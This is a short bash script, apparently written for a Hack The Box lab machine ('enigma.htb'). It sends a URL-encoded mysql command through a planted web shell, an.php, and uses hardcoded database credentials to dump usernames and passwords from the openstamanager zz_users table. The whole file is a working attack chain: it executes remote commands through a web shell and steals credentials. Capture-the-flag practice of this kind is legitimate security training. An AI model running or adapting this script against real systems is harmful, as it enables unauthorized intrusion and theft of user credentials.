#!/usr/bin/env bash
# Dump zz_users via an.php (www-data runs mysql client if available)
set -euo pipefail
IP="${1:-}"
[[ -z "$IP" ]] && { echo "Usage: $0 <ip>" >&2; exit 1; }

CMD="mysql -u brollin -pFri3nds@9099 -N -e 'select username,password from zz_users' openstamanager 2>/dev/null"
ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$CMD")
curl -s -H 'Host: support_001.enigma.htb' "http://${IP}/an.php?c=${ENC}"
echo